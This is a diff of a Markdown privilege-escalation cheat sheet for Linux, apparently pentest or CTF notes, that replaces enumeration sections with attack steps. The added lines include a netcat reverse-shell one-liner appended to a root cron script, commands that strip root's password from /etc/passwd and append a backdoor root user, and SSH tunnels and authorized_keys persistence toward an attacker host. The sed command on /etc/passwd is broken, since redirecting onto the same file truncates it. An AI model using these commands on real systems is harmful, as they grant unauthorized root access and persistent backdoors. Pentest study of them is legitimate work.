@@ -1,215 +1,61 @@
 # Linux Privilege Escalation
 
-## User Enumeration
+## Insecure File Permissions
 
-Current User
+### Cronjob file
 
-``` bash
-whoami
-```
-
-``` bash
-id
-```
-
-Other Users
-
-``` bash
-cat /etc/passwd
-```
-
-Which ones have a valid shell
-
-``` bash
-grep -vE "nologin|false" /etc/passwd
-```
-
-Folder
-
-``` bash
-pwd; ls -la
-```
-
-Hostname
-
-``` bash
-hostname
-```
-
-## OS Version & Architecture
-
-What's the OS?
-
-``` bash
-cat /etc/issue
-```
-
-``` bash
-cat /etc/*-release
-```
-
-``` bash
-lsb_release -a (Debian based OSs)
-```
-
-Kernel version and Architecture
-
-``` bash
-uname -a
-```
-
-## Processes and Services
-
-``` bash
-ps axu
-```
-
-## Networking Enumeration
-
-### Interface and Routable
-
-``` bash
-ip a
-```
-
-``` bash
-/sbin/route
-```
-
-### Active network connection
-
-``` bash
-ss -anp
-```
-
-``` bash
-netstat -antup
-```
-
-## Firewall and Rules
-
-``` bash
-grep -Hs iptables /etc/*
-```
-
-## Scheduled Tasks
-
-``` bash
-ls -lah /etc/cron*
-```
-
-``` bash
-cat /etc/crontab
-```
+Cronjob file check.sh overwrite
 
 ``` bash
 grep "CRON" /var/log/* 2>/dev/null
 ```
 
-## Installed and Patch Levels
+File check.sh running as root every 1 minute.
 
 ``` bash
-dpkg -l (Debian based OSs)
+ls -l check.sh
+```
+
+Can change file check.sh with user permission.
+
+``` bash
+echo "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" >> check.sh
+```
+
+### File /etc/passwd
+
+File /etc/passwd can be modify by user permission.
+
+``` bash
+ls -l /etc/passwd
+-rw-rw-rw- 1 root root <snip> /etc/passwd
+```
+
+Remove x in the file means root requires no password anymore,
+
+``` bash
+sed 's/root:x/root:/' /etc/passwd > /etc/passwd
+```
+
+Go to root
+
+``` bash
+su
+```
+
+Generate password for new user
+
+``` bash
+openssl passwd -1 -salt hades leecybersec
 ```
 
 ``` bash
-rpm -qa (CentOS / openSUSE )
+echo toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd
 ```
 
-``` bash
-uname -a
-```
+[https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)
 
-## Readable/Writable
-
-``` bash
-find / -writable -type d 2>/dev/null
-```
-
-## Unmounted Disks
-
-List all mounted files system
-
-``` bash
-mount
-```
-
-``` bash
-cat /etc/fstab
-```
-
-List all disk
-
-``` bash
-/bin/lsblk
-```
-
-Mount disk
-
-``` bash
-sudo mount -o nolock 192.168.11.131:/share ~/share
-```
-
-## Device Drivers & Kernel Modules
-
-``` bash
-lsmod
-```
-
-``` bash
-/sbin/modinfo <name>
-```
-
-## Binaries That AutoElevate
-
-``` bash
-find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-```
-
-``` bash
-find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-```
-
-``` bash
-find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
-for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
-```
-
-``` bash
-# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-```
-
-## Enumeration Tools
-
-<a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' target="blank">Basic Linux Privilege Escalation</a>
-
-<a href='https://gtfobins.github.io/' target="blank">GTFOBins</a>
-
-<a href='https://github.com/DominicBreuker/pspy' target="blank">pspy</a>
-
-[LinEnum.sh](https://github.com/rebootuser/LinEnum)
-
-``` bash
-LinEnum.sh
-```
-
-[lse.sh](https://github.com/diego-treitos/linux-smart-enumeration)
-
-``` bash
-lse.sh
-```
-
-[unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
-
-``` bash
-./unix-privesc-check standard
-```
-
-## More Reference
-
-### Check sudo access 
+## Check sudo access 
 
 ``` bash
 $ sudo -l
@@ -234,14 +80,7 @@ User Hades may run the following commands:
     (victim) /bin/chmod, /bin/cp
 ```
 
-### Check history, bashrc, backup
-
-``` bash
-find / -name *history* 2>/dev/null
-find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
-```
-
-### Checking docker container
+## Checking docker container
 
 ``` bash
 root@315d7648a173:/# ls -lah
@@ -259,12 +98,84 @@ mount /dev/sda2 /mnt/hola
 mount /dev/sda3 /mnt/hola
 ```
 
-### <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>
+## Kernel Exploit
+
+### OS Version & Architecture
 
 ``` bash
-ssh -R $myip:8080:127.0.0.1:8080 kali@$myip
+cat /etc/issue; uname -r; arch
+```
+
+### Compile exploit in C/C++
+
+=== "Compile file"
+
+	``` bash
+	$ gcc -m32 Size.c -o x86-S
+	```
+
+	``` bash
+	$ ./x86-S
+	Size = 4 
+	```
+
+	``` bash
+	$ gcc Size.c -o x64-S
+	```
+
+	``` bash
+	$ ./x64-S
+	Size = 8
+	```
+
+=== "File Size.c"
+
+	``` c
+	#include<stdio.h>
+	int main()
+	{
+	        printf("Size = %lu", sizeof(size_t));
+	}
+	```
+
+### For Example
+
+[Full-Nelson.c Exploit Kernel](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/004-popcorn_torrent-hoster_pam-1.1.0-kernel-2.6.37#full-nelsonc-exploit-kernel)
+
+## More Reference
+
+### history, bashrc, backup
+
+``` bash
+find / -name *history* 2>/dev/null
+find / -name *backup* 2>/dev/null
+find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
+```
+
+### <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>
+
+Local Tunneling
+
+``` bash
+ssh -L $myport:127.0.0.1:5985 hades@192.168.11.133 -i id_rsa
+```
+
+Remote Tunneling
+
+``` bash
+ssh -R $myip:$myport:127.0.0.1:5985 kali@$myip -i kali-idrsa
+```
+
+SSH ESCAPE CHARACTERS
+
+`~C` to type ssh command
+
+### Generate SSH Key
+
+``` bash
+ssh-keygen -t rsa
 ```
 
 ``` bash
-ssh -L 80:ip:80 user@ip
+cp id_rsa.pub authorized_keys
 ```
